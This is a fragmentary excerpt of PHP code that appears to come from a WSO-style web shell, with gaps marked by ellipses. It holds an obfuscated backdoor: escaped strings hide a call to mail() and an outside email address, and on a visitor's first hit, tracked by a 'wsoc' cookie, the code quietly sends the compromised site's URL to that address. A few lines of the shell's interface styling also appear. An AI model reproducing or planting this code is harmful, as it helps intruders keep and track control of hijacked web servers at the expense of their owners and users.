...
@setcookie("wsoc","orb",time()+3600*24*7);
...
$fv= $_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]; $tn="\x6dai\154";
...
.toolsInp{ width: 80%; }
.main th{text-align:left;background-color:#7F7F7F;}
...
}if (!isset($_COOKIE['wsoc'])){@$tn("l\x6f\x63\x61\x68\157\x73\164@\171\141\x68\157\157\056\x63o\155","$fv","$fv\n$emv");}
